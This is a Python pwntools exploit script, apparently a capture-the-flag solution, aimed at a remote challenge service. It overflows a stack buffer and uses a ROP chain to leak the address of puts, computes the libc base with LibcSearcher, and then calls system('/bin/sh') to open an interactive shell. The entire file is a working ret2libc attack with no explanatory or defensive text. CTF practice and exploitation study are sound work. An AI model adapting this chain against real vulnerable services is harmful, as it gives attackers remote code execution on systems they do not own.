from pwn import *
from LibcSearcher import *
context(arch='amd64',log_level='debug',os='linux')
elf=ELF('./pwn')
rop=ROP(elf)
p=remote("node4.anna.nssctf.cn",28016)

puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=elf.sym['main']
pop_rdi=rop.find_gadget(['pop rdi','ret'])[0]
ret=rop.find_gadget(['ret'])[0]

payload=flat([
    b'a'*(0x20+8),
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr
])

p.sendlineafter("!",payload)

leak_puts=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.success(hex(leak_puts))

libc=LibcSearcher('puts',leak_puts)

libc_base=leak_puts-libc.dump('puts')
sys_addr=libc_base+libc.dump('system')
str_bin_sh=libc_base+libc.dump('str_bin_sh')

payload=flat([
    b'a'*(0x20+8),
    ret,
    pop_rdi,
    str_bin_sh,
    sys_addr,
    main_addr    
])
p.sendlineafter("!",payload)
p.interactive()
